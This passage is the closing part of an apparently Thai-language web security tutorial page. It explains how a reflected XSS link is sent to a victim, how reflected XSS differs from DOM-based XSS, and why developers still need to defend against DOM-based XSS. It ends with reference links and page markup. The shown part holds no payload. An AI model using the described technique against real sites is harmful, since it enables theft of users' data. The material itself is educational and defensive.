                                </div>

                                <p class="mt-4">แล้วส่ง Link ด้านบนไปให้กับเหยื่อ แม้ว่าตัวอย่างจะเป็นการแค่แสดง alert
                                    box
                                    แต่ว่าในความเป็นจริง ผู้ไม่หวังดีสามารถแทรก JavaScript
                                    ที่มีความซับซ้อนมากกว่านี้เพื่อทำการขโมยข้อมูลของผู้ใช้งานได้</p>

                                <h3 class="mt-4">ข้อแตกต่างระหว่าง Reflected XSS และ DOM-based XSS</h3>

                                <p class="mt-4">อ่านมาถึงตรงนี้หลายคนอาจจะเริ่มมีคำถามว่า Reflected XSS และ DOM-based
                                    XSS
                                    นั้นต่างกันอย่างไร เนื่องจากทั้งคู่มีลักษณะคล้ายกันคือ ผู้ไม่หวังดีส่ง Link ที่มี
                                    JavaScript แทรกไปให้กับผู้ใช้งาน ข้อแตกต่างระหว่าง Reflected XSS และ DOM-based XSS
                                    นั้นคือ Reflected XSS นั้นใช้ back-end
                                    ( เช่น PHP/Ruby/Python/Java ) ในการแสดงผลข้อมูล JavaScript นในทางกลับกัน DOM-based
                                    XSS
                                    นั้นเป็นช่องโหว่ที่เกิดจาก JavaScript ในส่วนของ front-end
                                    ทั้งคู่สามารถสร้างความเสียหายได้พอกัน แต่ DOM-based XSS นั้นจะตรวจจับได้ยากกว่า
                                    Reflected XSS และ Stored XSS มากเนื่องจาก DOM-based XSS ไม่ได้ใช้งานในส่วนของ
                                    back-end
                                    เลย</p>


                                <div class="text-center mt-4">
                                    <img class="w-75" src="../../public/img/learn/8.png">
                                </div>

                                <p class="mt-4">อย่างไรก็ตามปัจจุบันเว็บเบราเซอร์ส่วนใหญ่ได้มีการทำ encode URL
                                    ทำให้ช่องโหว่ประเภท DOM-based XSS เกิดขึ้นได้ยาก อย่างไรก็ตาม หากนักพัฒนา
                                    เว็บแอปพลิเคชันที่ดีไม่ควรพลักภาระการแก้ไขช่องโหว่ไปให้ผู้พัฒนาเว็บเบราเซอร์
                                    อีกทั้งยังมีผู้ใช้งานบางกลุ่มที่ ( โดยเฉพาะในองค์กรขนาดใหญ่ ) ยังคงใช้เว็บ
                                    เบราเซอร์รุ่นเก่าที่มีช่องโหว่ DOM-based XSS
                                    นักพัฒนาเว็บแอปพลิเคชันที่ดีควรจะหมั่นตรวจสอบและป้องกันช่องโหว่ประเภท DOM-based XSS
                                    ให้ดี</p>


                                <h3 class="mt-4">แหล่งข้อมูลอ้างอิง</h3><br>
                                <p><a href="https://blog.tamacorp.co/xss/">https://blog.tamacorp.co/xss/</a></p>
                                <p><a>https://www.w3schools.com/js/js_htmldom.asp</a></p>
                                <p><a
                                        href="https://www.acunetix.com/blog/articles/dom-xss-explained/">https://www.acunetix.com/blog/articles/dom-xss-explained/</a>
                                </p>
                                <p><a
                                        href="https://www.acunetix.com/websitesecurity/cross-site-scripting/">https://www.acunetix.com/websitesecurity/cross-site-scripting/</a>
                                </p>
                                <p><a
                                        href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a>
                                </p>
                                <p><a
                                        href="http://www.webappsec.org/projects/articles/071105.shtml">http://www.webappsec.org/projects/articles/071105.shtml</a>
                                </p>
                            </div>
                        </div>

                        <div class="mt-5">
                            <input data-bs-target="#collapseExample2" type="button" style="width: 250px;"
                                onclick="readmore(this)" value="อ่านเพิ่มเติม" class="btn-custom-border"
                                data-bs-toggle="collapse" aria-expanded="false" aria-controls="collapseExample">
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <!-- Parallax start -->
    <div class="parallax"></div>
    <!-- Parallax end -->

    <!-- Custom JS -->
    <script src="../../assets/jscustom/learn.js"></script>
    <!-- Optional JavaScript; choose one of the two! -->

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="../../assets/js/bootstrap.bundle.min.js"></script>

    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
    -->
</body>

</html>